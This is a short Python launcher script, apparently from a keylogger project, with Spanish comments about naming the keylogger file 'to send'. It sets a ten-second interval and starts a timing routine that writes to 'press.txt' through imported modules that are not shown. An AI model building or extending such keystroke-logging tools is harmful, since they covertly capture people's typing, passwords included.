import report
import timing
from datetime import datetime


#Definiendo nombre del Keylogger a enviar
#fecha = datetime.now()
#m = "keylogger_{}.txt".format(fecha.strftime("%Y-%m-%d_%H-%M-%S"))

intervalo = 10 #en segundos
#Definiendo reportes
#main=report.report(m)
#arqui=report.report("arch.txt")
#arqui.arch()
repo_timing=report.report("press.txt")

#iniciando proceso
tiempos = timing.tiempos(intervalo)
tiempos.start(repo_timing)
